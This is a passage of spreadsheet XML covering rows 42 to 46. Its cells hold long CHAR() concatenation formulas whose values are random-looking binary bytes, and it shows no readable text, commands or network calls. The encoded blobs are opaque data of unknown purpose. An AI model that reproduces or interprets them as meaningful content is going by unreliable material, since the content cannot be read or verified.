;CHAR(199)&amp;CHAR(15)&amp;CHAR(211)&amp;CHAR(252)&amp;CHAR(226)&amp;CHAR(105)&amp;CHAR(196)&amp;CHAR(218)&amp;CHAR(254)&amp;CHAR(22)&amp;CHAR(151)&amp;CHAR(223)&amp;CHAR(83)&amp;CHAR(34)&amp;CHAR(8)&amp;CHAR(73)&amp;CHAR(125)&amp;CHAR(196)&amp;CHAR(235)&amp;CHAR(92)&amp;CHAR(121)&amp;CHAR(247)&amp;CHAR(221)&amp;CHAR(124)&amp;CHAR(32)&amp;CHAR(163)&amp;CHAR(9)&amp;CHAR(167)&amp;CHAR(164)&amp;CHAR(102)&amp;CHAR(97)&amp;CHAR(138)&amp;CHAR(109)&amp;CHAR(37)&amp;CHAR(249)&amp;CHAR(67)&amp;CHAR(3)&amp;CHAR(25)&amp;CHAR(68)&amp;CHAR(159)&amp;CHAR(136)</f>
        <v>ÒÊWÞ§ž_x001B_ñï_x000D__x001E_ó´ÛÜl_x0019_ ,X½»µ_x0011_¢yHÜ?ê_x0001_Ê*æ_x000E__nÝ* ñ¢¯º¤=pÆú¸ñ¹+ŒÄU_x001A_Dýúíê_x0013_w†_x0013_Ü¿œOÅ½ÿçµ3G”OçO_x0002_ûéÞ_x001B_×_x0008_ÒR¶†_x0010_Ïe^_x0016_˜_x0006__x000C_ ÚB_x000C_+»Yj(å_x0019_Éâ´Æ˜¤AfèïÛ»ãŽõ-Åƒ_x000B_U½_x001A_EÒ_x0003_8-}_x0008_—–N_x0015_®-€eB›#ð¸É^çðKÑ×Ší	»ï÷`c@&lt;žÖÓcF†6_x0005_JZ
!	j­¨ôÉ±_x0004_&amp;xR®Ø¼^_x0002__x001A__x000D_Œ÷fŸUWC©UÇ_x000F_ÓüâiÄÚþ_x0016_—ßS"_x0008_I}Äë\y÷Ý| £	§¤faŠm%ùC_x0003__x0019_DŸˆ</v>
      </c>
      <c r="C42" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(236)&amp;CHAR(120)&amp;CHAR(15)&amp;CHAR(110)&amp;CHAR(249)&amp;CHAR(91)&amp;CHAR(221)</f>
        <v>ÖÈ!ìx_x000F_nù[Ý</v>
      </c>
    </row>
    <row r="43" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B43" t="str">
        <f>CHAR(190)&amp;CHAR(221)&amp;CHAR(39)&amp;CHAR(237)&amp;CHAR(42)&amp;CHAR(194)&amp;CHAR(170)&amp;CHAR(43)&amp;CHAR(93)&amp;CHAR(63)&amp;CHAR(166)&amp;CHAR(196)&amp;CHAR(162)&amp;CHAR(156)&amp;CHAR(84)&amp;CHAR(204)&amp;CHAR(202)&amp;CHAR(228)&amp;CHAR(148)&amp;CHAR(192)&amp;CHAR(203)&amp;CHAR(154)&amp;CHAR(196)&amp;CHAR(71)&amp;CHAR(246)&amp;CHAR(158)&amp;CHAR(162)&amp;CHAR(101)&amp;CHAR(148)&amp;CHAR(96)&amp;CHAR(44)&amp;CHAR(74)&amp;CHAR(30)&amp;CHAR(156)&amp;CHAR(52)&amp;CHAR(206)&amp;CHAR(25)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(36)&amp;CHAR(213)&amp;CHAR(141)&amp;CHAR(32)&amp;CHAR(107)&amp;CHAR(156)&amp;CHAR(22)&amp;CHAR(254)&amp;CHAR(145)&amp;CHAR(147)&amp;CHAR(244)&amp;CHAR(233)&amp;CHAR(120)&amp;CHAR(230)&amp;CHAR(137)&amp;CHAR(236)&amp;CHAR(151)&amp;CHAR(39)&amp;CHAR(60)&amp;CHAR(203)&amp;CHAR(76)&amp;CHAR(248)&amp;CHAR(11)&amp;CHAR(87)&amp;CHAR(152)&amp;CHAR(114)&amp;CHAR(99)&amp;CHAR(147)&amp;CHAR(65)&amp;CHAR(7)&amp;CHAR(149)&amp;CHAR(37)&amp;CHAR(38)&amp;CHAR(74)&amp;CHAR(145)&amp;CHAR(99)&amp;CHAR(210)&amp;CHAR(161)&amp;CHAR(242)&amp;CHAR(123)&amp;CHAR(84)&amp;CHAR(166)&amp;CHAR(139)&amp;CHAR(96)&amp;CHAR(208)&amp;CHAR(98)&amp;CHAR(33)&amp;CHAR(125)&amp;CHAR(46)&amp;CHAR(26)&amp;CHAR(60)&amp;CHAR(162)&amp;CHAR(132)&amp;CHAR(255)&amp;CHAR(91)&amp;CHAR(176)&amp;CHAR(169)&amp;CHAR(170)&amp;CHAR(188)&amp;CHAR(114)&amp;CHAR(121)&amp;CHAR(3)&amp;CHAR(141)&amp;CHAR(183)&amp;CHAR(189)&amp;CHAR(215)&amp;CHAR(18)&amp;CHAR(218)&amp;CHAR(19)&amp;CHAR(174)&amp;CHAR(26)&amp;CHAR(75)&amp;CHAR(92)&amp;CHAR(56)&amp;CHAR(142)&amp;CHAR(199)&amp;CHAR(89)&amp;CHAR(54)&amp;CHAR(47)&amp;CHAR(235)&amp;CHAR(156)&amp;CHAR(180)&amp;CHAR(21)&amp;CHAR(185)&amp;CHAR(94)&amp;CHAR(129)&amp;CHAR(3)&amp;CHAR(48)&amp;CHAR(36)&amp;CHAR(19)&amp;CHAR(137)&amp;CHAR(205)&amp;CHAR(194)&amp;CHAR(172)&amp;CHAR(126)&amp;CHAR(200)&amp;CHAR(132)&amp;CHAR(193)&amp;CHAR(11)&amp;CHAR(216)&amp;CHAR(240)&amp;CHAR(76)&amp;CHAR(198)&amp;CHAR(21)&amp;CHAR(140)&amp;CHAR(51)&amp;CHAR(50)&amp;CHAR(175)&amp;CHAR(191)&amp;CHAR(120)&amp;CHAR(72)&amp;CHAR(232)&amp;CHAR(247)&amp;CHAR(46)&amp;CHAR(246)&amp;CHAR(48)&amp;CHAR(87)&amp;CHAR(136)&amp;CHAR(32)&amp;CHAR(220)&amp;CHAR(229)&amp;CHAR(162)&amp;CHAR(3)&amp;CHAR(81)&amp;CHAR(144)&amp;CHAR(197)&amp;CHAR(220)&amp;CHAR(158)&amp;CHAR(172)&amp;CHAR(147)&amp;CHAR(61)&amp;CHAR(97)&amp;CHAR(1)&amp;CHAR(32)&amp;CHAR(37)&amp;CHAR(67)&amp;CHAR(207)&amp;CHAR(176)&amp;CHAR(67)&amp;CHAR(203)&amp;CHAR(225)&amp;CHAR(35)&amp;CHAR(136)&amp;CHAR(88)&amp;CHAR(216)&amp;CHAR(242)&amp;CHAR(172)&amp;CHAR(231)&amp;CHAR(62)&amp;CHAR(201)&amp;CHAR(116)&amp;CHAR(118)&amp;CHAR(156)&amp;CHAR(154)&amp;CHAR(135)&amp;CHAR(67)&amp;CHAR(166)&amp;CHAR(225)&amp;CHAR(165)&amp;CHAR(140)&amp;CHAR(74)&amp;CHAR(35)&amp;CHAR(151)&amp;CHAR(29)&amp;CHAR(215)&amp;CHAR(26)&amp;CHAR(210)&amp;CHAR(252)&amp;CHAR(128)&amp;CHAR(216)&amp;CHAR(2)&amp;CHAR(60)&amp;CHAR(253)&amp;CHAR(57)&amp;CHAR(192)&amp;CHAR(140)&amp;CHAR(22)&amp;CHAR(229)&amp;CHAR(221)&amp;CHAR(212)&amp;CHAR(53)&amp;CHAR(41)&amp;CHAR(206)&amp;CHAR(149)&amp;CHAR(198)&amp;CHAR(109)&amp;CHAR(54)&amp;CHAR(253)&amp;CHAR(10)&amp;CHAR(178)&amp;CHAR(194)&amp;CHAR(219)&amp;CHAR(38)&amp;CHAR(95)&amp;CHAR(53)&amp;CHAR(36)&amp;CHAR(129)&amp;CHAR(237)&amp;CHAR(200)&amp;CHAR(170)&amp;CHAR(233)&amp;CHAR(61)&amp;CHAR(101)&amp;CHAR(50)&amp;CHAR(24)&amp;CHAR(171)&amp;CHAR(4)&amp;CHAR(51)&amp;CHAR(169)&amp;CHAR(229)&amp;CHAR(70)&amp;CHAR(84)&amp;CHAR(224)&amp;CHAR(203)&amp;CHAR(194)&amp;CHAR(13)</f>
        <v>¾Ý'í*Âª+]?¦Ä¢œTÌÊä”ÀËšÄGöž¢e”`,J_x001E_œ4Î_x0019_]ô$Õ kœ_x0016_þ‘“ôéxæ‰ì—'&lt;ËLø_x000B_W˜rc“A_x0007_•%&amp;J‘cÒ¡ò{T¦‹`Ðb!}._x001A_&lt;¢„ÿ[°©ª¼ry_x0003_·½×_x0012_Ú_x0013_®_x001A_K\8ŽÇY6/ëœ´_x0015_¹^_x0003_0$_x0013_‰ÍÂ¬~È„Á_x000B_ØðLÆ_x0015_Œ32¯¿xHè÷.ö0Wˆ Üå¢_x0003_QÅÜž¬“=a_x0001_ %CÏ°CËá#ˆXØò¬ç&gt;Étvœš‡C¦á¥ŒJ#—_x001D_×_x001A_Òü€Ø_x0002_&lt;ý9ÀŒ_x0016_åÝÔ5)Î•Æm6ý
²ÂÛ&amp;_5$íÈªé=e2_x0018_«_x0004_3©åFTàËÂ_x000D_</v>
      </c>
      <c r="C43" t="str">
        <f>CHAR(52)&amp;CHAR(160)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(118)&amp;CHAR(60)&amp;CHAR(219)&amp;CHAR(54)&amp;CHAR(37)&amp;CHAR(165)</f>
        <v>4 ûÏv&lt;Û6%¥</v>
      </c>
    </row>
    <row r="44" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B44" t="str">
        <f>CHAR(160)&amp;CHAR(194)&amp;CHAR(234)&amp;CHAR(104)&amp;CHAR(22)&amp;CHAR(164)&amp;CHAR(211)&amp;CHAR(140)&amp;CHAR(172)&amp;CHAR(133)&amp;CHAR(89)&amp;CHAR(8)&amp;CHAR(224)&amp;CHAR(119)&amp;CHAR(230)&amp;CHAR(48)&amp;CHAR(41)&amp;CHAR(218)&amp;CHAR(225)&amp;CHAR(210)&amp;CHAR(220)&amp;CHAR(58)&amp;CHAR(122)&amp;CHAR(53)&amp;CHAR(79)&amp;CHAR(50)&amp;CHAR(184)&amp;CHAR(25)&amp;CHAR(221)&amp;CHAR(160)&amp;CHAR(29)&amp;CHAR(131)&amp;CHAR(71)&amp;CHAR(56)&amp;CHAR(69)&amp;CHAR(40)&amp;CHAR(9)&amp;CHAR(143)&amp;CHAR(138)&amp;CHAR(104)&amp;CHAR(248)&amp;CHAR(232)&amp;CHAR(75)&amp;CHAR(63)&amp;CHAR(170)&amp;CHAR(206)&amp;CHAR(53)&amp;CHAR(251)&amp;CHAR(120)&amp;CHAR(71)&amp;CHAR(2)&amp;CHAR(77)&amp;CHAR(225)&amp;CHAR(170)&amp;CHAR(20)&amp;CHAR(211)&amp;CHAR(118)&amp;CHAR(3)&amp;CHAR(254)&amp;CHAR(211)&amp;CHAR(105)&amp;CHAR(187)&amp;CHAR(105)&amp;CHAR(220)&amp;CHAR(148)&amp;CHAR(101)&amp;CHAR(190)&amp;CHAR(53)&amp;CHAR(200)&amp;CHAR(30)&amp;CHAR(170)&amp;CHAR(92)&amp;CHAR(143)&amp;CHAR(161)&amp;CHAR(67)&amp;CHAR(161)&amp;CHAR(32)&amp;CHAR(251)&amp;CHAR(166)&amp;CHAR(34)&amp;CHAR(254)&amp;CHAR(92)&amp;CHAR(16)&amp;CHAR(168)&amp;CHAR(183)&amp;CHAR(161)&amp;CHAR(240)&amp;CHAR(235)&amp;CHAR(74)&amp;CHAR(211)&amp;CHAR(118)&amp;CHAR(224)&amp;CHAR(237)&amp;CHAR(213)&amp;CHAR(190)&amp;CHAR(177)&amp;CHAR(80)&amp;CHAR(161)&amp;CHAR(238)&amp;CHAR(38)&amp;CHAR(116)&amp;CHAR(103)&amp;CHAR(228)&amp;CHAR(134)&amp;CHAR(69)&amp;CHAR(98)&amp;CHAR(62)&amp;CHAR(212)&amp;CHAR(172)&amp;CHAR(132)&amp;CHAR(234)&amp;CHAR(147)&amp;CHAR(224)&amp;CHAR(241)&amp;CHAR(39)&amp;CHAR(36)&amp;CHAR(51)&amp;CHAR(41)&amp;CHAR(199)&amp;CHAR(33)&amp;CHAR(112)&amp;CHAR(28)&amp;CHAR(25)&amp;CHAR(56)&amp;CHAR(185)&amp;CHAR(140)&amp;CHAR(183)&amp;CHAR(201)&amp;CHAR(160)&amp;CHAR(188)&amp;CHAR(165)&amp;CHAR(39)&amp;CHAR(33)&amp;CHAR(52)&amp;CHAR(168)&amp;CHAR(41)&amp;CHAR(3)&amp;CHAR(220)&amp;CHAR(64)&amp;CHAR(51)&amp;CHAR(178)&amp;CHAR(158)&amp;CHAR(253)&amp;CHAR(20)&amp;CHAR(68)&amp;CHAR(166)&amp;CHAR(97)&amp;CHAR(68)&amp;CHAR(3)&amp;CHAR(185)&amp;CHAR(21)&amp;CHAR(244)&amp;CHAR(77)&amp;CHAR(37)&amp;CHAR(206)&amp;CHAR(112)&amp;CHAR(65)&amp;CHAR(7)&amp;CHAR(185)&amp;CHAR(59)&amp;CHAR(196)&amp;CHAR(28)&amp;CHAR(241)&amp;CHAR(214)&amp;CHAR(218)&amp;CHAR(244)&amp;CHAR(62)&amp;CHAR(187)&amp;CHAR(47)&amp;CHAR(46)&amp;CHAR(96)&amp;CHAR(183)&amp;CHAR(204)&amp;CHAR(213)&amp;CHAR(230)&amp;CHAR(108)&amp;CHAR(204)&amp;CHAR(122)&amp;CHAR(26)&amp;CHAR(228)&amp;CHAR(99)&amp;CHAR(26)&amp;CHAR(230)&amp;CHAR(53)&amp;CHAR(171)&amp;CHAR(129)&amp;CHAR(224)&amp;CHAR(90)&amp;CHAR(91)&amp;CHAR(235)&amp;CHAR(252)&amp;CHAR(18)&amp;CHAR(108)&amp;CHAR(71)&amp;CHAR(200)&amp;CHAR(14)&amp;CHAR(163)&amp;CHAR(37)&amp;CHAR(202)&amp;CHAR(87)&amp;CHAR(173)&amp;CHAR(43)&amp;CHAR(82)&amp;CHAR(245)&amp;CHAR(17)&amp;CHAR(180)&amp;CHAR(173)&amp;CHAR(107)&amp;CHAR(188)&amp;CHAR(215)&amp;CHAR(108)&amp;CHAR(74)&amp;CHAR(52)&amp;CHAR(82)&amp;CHAR(47)&amp;CHAR(11)&amp;CHAR(15)&amp;CHAR(83)&amp;CHAR(49)&amp;CHAR(240)&amp;CHAR(12)&amp;CHAR(252)&amp;CHAR(69)&amp;CHAR(208)&amp;CHAR(54)&amp;CHAR(3)&amp;CHAR(241)&amp;CHAR(50)&amp;CHAR(68)&amp;CHAR(126)&amp;CHAR(247)&amp;CHAR(58)&amp;CHAR(191)&amp;CHAR(224)&amp;CHAR(188)&amp;CHAR(221)&amp;CHAR(180)&amp;CHAR(56)&amp;CHAR(85)&amp;CHAR(254)&amp;CHAR(218)&amp;CHAR(192)&amp;CHAR(153)&amp;CHAR(225)&amp;CHAR(231)&amp;CHAR(3)&amp;CHAR(69)&amp;CHAR(20)&amp;CHAR(10)&amp;CHAR(18)&amp;CHAR(86)&amp;CHAR(195)&amp;CHAR(15)&amp;CHAR(25)&amp;CHAR(107)</f>
        <v> Âêh_x0016_¤ÓŒ¬…Y_x0008_àwæ0)ÚáÒÜ:z5O2¸_x0019_Ý _x001D_ƒG8E(	ŠhøèK?ªÎ5ûxG_x0002_Máª_x0014_Óv_x0003_þÓi»iÜ”e¾5È_x001E_ª\¡C¡ û¦"þ\_x0010_¨·¡ðëJÓvàíÕ¾±P¡î&amp;tgä†Eb&gt;Ô¬„ê“àñ'$3)Ç!p_x001C__x0019_8¹Œ·É ¼¥'!4¨)_x0003_Ü@3²žý_x0014_D¦aD_x0003_¹_x0015_ôM%ÎpA_x0007_¹;Ä_x001C_ñÖÚô&gt;»/.`·ÌÕælÌz_x001A_äc_x001A_æ5«àZ[ëü_x0012_lGÈ_x000E_£%ÊW­+Rõ_x0011_´­k¼×lJ4R/_x000B__x000F_S1ð_x000C_üEÐ6_x0003_ñ2D~÷:¿à¼Ý´8UþÚÀ™áç_x0003_E_x0014_
_x0012_VÃ_x000F__x0019_k</v>
      </c>
      <c r="C44" t="str">
        <f>CHAR(251)&amp;CHAR(170)&amp;CHAR(118)&amp;CHAR(58)&amp;CHAR(226)&amp;CHAR(237)&amp;CHAR(9)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûªv:âí	¥ûÏ</v>
      </c>
    </row>
    <row r="45" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B45" t="str">
        <f>CHAR(65)&amp;CHAR(245)&amp;CHAR(243)&amp;CHAR(37)&amp;CHAR(199)&amp;CHAR(7)&amp;CHAR(44)&amp;CHAR(97)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(37)&amp;CHAR(71)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(62)&amp;CHAR(59)&amp;CHAR(215)&amp;CHAR(112)&amp;CHAR(2)&amp;CHAR(113)&amp;CHAR(85)&amp;CHAR(124)&amp;CHAR(173)&amp;CHAR(198)&amp;CHAR(125)&amp;CHAR(132)&amp;CHAR(114)&amp;CHAR(218)&amp;CHAR(92)&amp;CHAR(191)&amp;CHAR(148)&amp;CHAR(100)&amp;CHAR(71)&amp;CHAR(15)&amp;CHAR(126)&amp;CHAR(239)&amp;CHAR(38)&amp;CHAR(153)&amp;CHAR(24)&amp;CHAR(152)&amp;CHAR(113)&amp;CHAR(20)&amp;CHAR(30)&amp;CHAR(199)&amp;CHAR(224)&amp;CHAR(87)&amp;CHAR(230)&amp;CHAR(224)&amp;CHAR(133)&amp;CHAR(71)&amp;CHAR(156)&amp;CHAR(217)&amp;CHAR(239)&amp;CHAR(71)&amp;CHAR(166)&amp;CHAR(233)&amp;CHAR(108)&amp;CHAR(84)&amp;CHAR(216)&amp;CHAR(170)&amp;CHAR(127)&amp;CHAR(18)&amp;CHAR(109)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(196)&amp;CHAR(211)&amp;CHAR(225)&amp;CHAR(9)&amp;CHAR(195)&amp;CHAR(112)&amp;CHAR(158)&amp;CHAR(100)&amp;CHAR(227)&amp;CHAR(99)&amp;CHAR(253)&amp;CHAR(236)&amp;CHAR(155)&amp;CHAR(15)&amp;CHAR(129)&amp;CHAR(169)&amp;CHAR(42)&amp;CHAR(79)&amp;CHAR(52)&amp;CHAR(49)&amp;CHAR(78)&amp;CHAR(137)&amp;CHAR(186)&amp;CHAR(208)&amp;CHAR(96)&amp;CHAR(29)&amp;CHAR(227)&amp;CHAR(142)&amp;CHAR(135)&amp;CHAR(33)&amp;CHAR(117)&amp;CHAR(145)&amp;CHAR(228)&amp;CHAR(213)&amp;CHAR(61)&amp;CHAR(4)&amp;CHAR(230)&amp;CHAR(233)&amp;CHAR(34)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(38)&amp;CHAR(210)&amp;CHAR(219)&amp;CHAR(6)&amp;CHAR(121)&amp;CHAR(31)&amp;CHAR(6)&amp;CHAR(236)&amp;CHAR(162)&amp;CHAR(228)&amp;CHAR(184)&amp;CHAR(101)&amp;CHAR(203)&amp;CHAR(204)&amp;CHAR(128)&amp;CHAR(173)&amp;CHAR(92)&amp;CHAR(187)&amp;CHAR(61)&amp;CHAR(151)&amp;CHAR(187)&amp;CHAR(29)&amp;CHAR(91)&amp;CHAR(238)&amp;CHAR(145)&amp;CHAR(248)&amp;CHAR(137)&amp;CHAR(55)&amp;CHAR(101)&amp;CHAR(69)&amp;CHAR(189)&amp;CHAR(170)&amp;CHAR(44)&amp;CHAR(139)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(66)&amp;CHAR(169)&amp;CHAR(222)&amp;CHAR(35)&amp;CHAR(174)&amp;CHAR(21)&amp;CHAR(123)&amp;CHAR(167)&amp;CHAR(239)&amp;CHAR(197)&amp;CHAR(70)&amp;CHAR(89)&amp;CHAR(76)&amp;CHAR(30)&amp;CHAR(115)&amp;CHAR(197)&amp;CHAR(109)&amp;CHAR(93)&amp;CHAR(39)&amp;CHAR(194)&amp;CHAR(103)&amp;CHAR(4)&amp;CHAR(173)&amp;CHAR(37)&amp;CHAR(146)&amp;CHAR(142)&amp;CHAR(115)&amp;CHAR(7)&amp;CHAR(191)&amp;CHAR(248)&amp;CHAR(39)&amp;CHAR(116)&amp;CHAR(199)&amp;CHAR(211)&amp;CHAR(78)&amp;CHAR(85)&amp;CHAR(121)&amp;CHAR(174)&amp;CHAR(53)&amp;CHAR(86)&amp;CHAR(226)&amp;CHAR(166)&amp;CHAR(14)&amp;CHAR(231)&amp;CHAR(126)&amp;CHAR(40)&amp;CHAR(120)&amp;CHAR(255)&amp;CHAR(218)&amp;CHAR(136)&amp;CHAR(86)&amp;CHAR(245)&amp;CHAR(12)&amp;CHAR(11)&amp;CHAR(161)&amp;CHAR(19)&amp;CHAR(116)&amp;CHAR(63)&amp;CHAR(222)&amp;CHAR(46)&amp;CHAR(5)&amp;CHAR(231)&amp;CHAR(96)&amp;CHAR(15)&amp;CHAR(79)&amp;CHAR(84)&amp;CHAR(77)&amp;CHAR(28)&amp;CHAR(236)&amp;CHAR(246)&amp;CHAR(66)&amp;CHAR(15)&amp;CHAR(101)&amp;CHAR(188)&amp;CHAR(59)&amp;CHAR(24)&amp;CHAR(36)&amp;CHAR(68)&amp;CHAR(243)&amp;CHAR(156)&amp;CHAR(127)&amp;CHAR(227)&amp;CHAR(205)&amp;CHAR(220)&amp;CHAR(98)&amp;CHAR(115)&amp;CHAR(206)&amp;CHAR(92)&amp;CHAR(65)&amp;CHAR(154)&amp;CHAR(174)&amp;CHAR(11)&amp;CHAR(34)&amp;CHAR(66)&amp;CHAR(1)&amp;CHAR(186)&amp;CHAR(249)&amp;CHAR(20)&amp;CHAR(161)&amp;CHAR(205)&amp;CHAR(63)&amp;CHAR(67)&amp;CHAR(129)&amp;CHAR(195)&amp;CHAR(76)&amp;CHAR(221)&amp;CHAR(223)&amp;CHAR(74)&amp;CHAR(209)&amp;CHAR(93)&amp;CHAR(75)&amp;CHAR(190)&amp;CHAR(129)</f>
        <v>Aõó%Ç_x0007_,aþT%G_x0005_Œ&gt;;×p_x0002_qU|­Æ}„rÚ\¿”dG_x000F_~ï&amp;™_x0018_˜q_x0014__x001E_ÇàWæà…GœÙïG¦élTØª_x0012_m_x0006__x0005_ÄÓá	Ãpždãcýì›_x000F_©*O41N‰ºÐ`_x001D_ãŽ‡!u‘äÕ=_x0004_æé"Í&gt;&amp;ÒÛ_x0006_y_x001F__x0006_ì¢ä¸eËÌ€­\»=—»_x001D_[î‘ø‰7eE½ª,‹ˆOB©Þ#®_x0015_{§ïÅFYL_x001E_sÅm]'Âg_x0004_­%’Žs_x0007_¿ø'tÇÓNUy®5Vâ¦_x000E_ç~(xÿÚˆVõ_x000C__x000B_¡_x0013_t?Þ._x0005_ç`_x000F_OTM_x001C_ìöB_x000F_e¼;_x0018_$DóœãÍÜbsÎ\Aš®_x000B_"B_x0001_ºù_x0014_¡Í?CÃLÝßJÑ]K¾</v>
      </c>
      <c r="C45" t="str">
        <f>CHAR(193)&amp;CHAR(231)&amp;CHAR(246)&amp;CHAR(77)&amp;CHAR(225)&amp;CHAR(170)&amp;CHAR(126)&amp;CHAR(177)&amp;CHAR(61)&amp;CHAR(177)</f>
        <v>ÁçöMáª~±=±</v>
      </c>
    </row>
    <row r="46" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B46" t="str">
        <f>CHAR(140)&amp;CHAR(112)&amp;CHAR(14)&amp;CHAR(66)&amp;CHAR(221)&amp;CHAR(96)&amp;CHAR(208)&amp;CHAR(73)&amp;CHAR(185)&amp;CHAR(49)&amp;CHAR(70)&amp;CHAR(25)&amp;CHAR(244)&amp;CHAR(241)&amp;CHAR(218)&amp;CHAR(141)&amp;CHAR(181)&amp;CHAR(147)&amp;CHAR(171)&amp;CHAR(175)&amp;CHAR(178)&amp;CHAR(237)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(129)&amp;CHAR(15)&amp;CHAR(254)&amp;CHAR(19)&amp;CHAR(230)&amp;CHAR(100)&amp;CHAR(193)&amp;CHAR(203)&amp;CHAR(153)&amp;CHAR(137)&amp;CHAR(227)&amp;CHAR(182)&amp;CHAR(248)&amp;CHAR(76)&amp;CHAR(27)&amp;CHAR(177)&amp;CHAR(40)&amp;CHAR(190)&amp;CHAR(112)&amp;CHAR(98)&amp;CHAR(210)&amp;CHAR(13)&amp;CHAR(130)&amp;CHAR(103)&amp;CHAR(177)&amp;CHAR(121)&amp;CHAR(60)&amp;CHAR(202)&amp;CHAR(165)&amp;CHAR(12)&amp;CHAR(181)&amp;CHAR(201)&amp;CHAR(168)&amp;CHAR(121)&amp;CHAR(17)&amp;CHAR(69)&amp;CHAR(189)&amp;CHAR(179)&amp;CHAR(186)&amp;CHAR(217)&amp;CHAR(248)&amp;CHAR(244)&amp;CHAR(106)&amp;CHAR(116)&amp;CHAR(17)&amp;CHAR(107)&amp;CHAR(7)&amp;CHAR(98)&amp;CHAR(115)&amp;CHAR(121)&amp;CHAR(156)&amp;CHAR(56)&amp;CHAR(31)&amp;CHAR(246)&amp;CHAR(179)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(174)&amp;CHAR(52)&amp;CHAR(221)&amp;CHAR(254)&amp;CHAR(245)&amp;CHAR(123)&amp;CHAR(51)&amp;CHAR(112)&amp;CHAR(88)&amp;CHAR(69)&amp;CHAR(177)&amp;CHAR(206)&amp;CHAR(11)&amp;CHAR(220)&amp;CHAR(153)&amp;CHAR(75)&amp;CHAR(53)&amp;CHAR(165)&amp;CHAR(155)&amp;CHAR(8)&amp;CHAR(186)&amp;CHAR(143)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(82)&amp;CHAR(179)&amp;CHAR(116)&amp;CHAR(231)&amp;CHAR(116)&amp;CHAR(228)&amp;CHAR(110)&amp;CHAR(44)&amp;CHAR(187)&amp;CHAR(4)&amp;CHAR(29)&amp;CHAR(163)&amp;CHAR(24)&amp;CHAR(125)&amp;CHAR(87)&amp;CHAR(63)&amp;CHAR(100)&amp;CHAR(95)&amp;CHAR(233)&amp;CHAR(30)&amp;CHAR(136)&amp;CHAR(76)&amp;CHAR(205)&amp;CHAR(132)&amp;CHAR(150)&amp;CHAR(93)&amp;CHAR(185)&amp;CHAR(14)&amp;CHAR(229)&amp;CHAR(169)&amp;CHAR(34)&amp;CHAR(159)&amp;CHAR(7)&amp;CHAR(96)&amp;CHAR(101)&amp;CHAR(126)&amp;CHAR(165)&amp;CHAR(59)&amp;CHAR(51)&amp;CHAR(168)&amp;CHAR(61)&amp;CHAR(111)&amp;CHAR(72)&amp;CHAR(248)&amp;CHAR(81)&amp;CHAR(19)&amp;CHAR(62)&amp;CHAR(8)&amp;CHAR(4)&amp;CHAR(222)&amp;CHAR(35)&amp;CHAR(115)&amp;CHAR(159)&amp;CHAR(113)&amp;CHAR(96)&amp;CHAR(99)&amp;CHAR(62)&amp;CHAR(255)&amp;CHAR(96)&amp;CHAR(248)&amp;CHAR(244)&amp;CHAR(170)&amp;CHAR(188)&amp;CHAR(49)&amp;CHAR(157)&amp;CHAR(140)&amp;CHAR(103)&amp;CHAR(56)&amp;CHAR(218)&amp;CHAR(80)&amp;CHAR(85)&amp;CHAR(34)&amp;CHAR(44)&amp;CHAR(22)&amp;CHAR(82)&amp;CHAR(65)&amp;CHAR(235)&amp;CHAR(175)&amp;CHAR(64)&amp;CHAR(36)&amp;CHAR(250)&amp;CHAR(193)&amp;CHAR(170)&amp;CHAR(12)&amp;CHAR(11)&amp;CHAR(239)&amp;CHAR(154)&amp;CHAR(204)&amp;CHAR(92)&amp;CHAR(61)&amp;CHAR(23)&amp;CHAR(134)&amp;CHAR(233)&amp;CHAR(54)&amp;CHAR(191)&amp;CHAR(85)&amp;CHAR(139)&amp;CHAR(71)&amp;CHAR(221)&amp;CHAR(185)&amp;CHAR(8)&amp;CHAR(141)&amp;CHAR(114)&amp;CHAR(186)&amp;CHAR(242)&amp;CHAR(108)&amp;CHAR(188)&amp;CHAR(161)&amp;CHAR(249)&amp;CHAR(214)&amp;CHAR(232)&amp;CHAR(135)&amp;CHAR(35)&amp;CHAR(23)&amp;CHAR(196)&amp;CHAR(99)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(139)&amp;CHAR(178)&amp;CHAR(217)&amp;CHAR(38)&amp;CHAR(96)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(181)&amp;CHAR(245)&amp;CHAR(222)&amp;CHAR(181)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(157)&amp;CHAR(148)&amp;CHAR(116)&amp;CHAR(48)&amp;CHAR(57)&amp;CHAR(41)&amp;CHAR(33)&amp;CHAR(204)&amp;CHAR(113)&amp;CHAR(176)&amp;CHAR(172)&amp;CHAR(230)&amp;CHAR(70)&amp;CHAR(150)&amp;CHAR(66)&amp;CHAR(36)&amp;CHAR(123)&amp;CHAR(162)&amp;CHAR(85)</f>
        <v>Œp_x000E_BÝ`ÐI¹1F_x0019_ôñÚµ“«¯²í…`_x000F_þ_x0013_ædÁË™‰ã¶øL_x001B_±(¾pbÒ_x000D_‚g±y&lt;Ê¥_x000C_µÉ¨y_x0011_E½³ºÙøôjt_x0011_k_x0007_bsyœ8_x001F_ö³r×®4Ýþõ{3pXE±Î_x000B_Ü™K5¥›_x0008_º_x0001__x0013_R³tçtän,»_x0004__x001D_£_x0018_}W?d_é_x001E_ˆLÍ„–]¹_x000E_å©"Ÿ_x0007_`e~¥;3¨=oHøQ_x0013_&gt;_x0008__x0004_Þ#sŸq`c&gt;ÿ`øôª¼1Œg8ÚPU",_x0016_RAë¯@$úÁª_x000C__x000B_ïšÌ\=_x0017_†é6¿U‹GÝ¹_x0008_rºòl¼¡ùÖè‡#_x0017_Äc_x0004__x0002_‹²Ù&amp;`½;µõÞµ‹J”t09)!Ìq°¬æF–B${¢U</v>
      </c>
      <c r="C46" t="str">
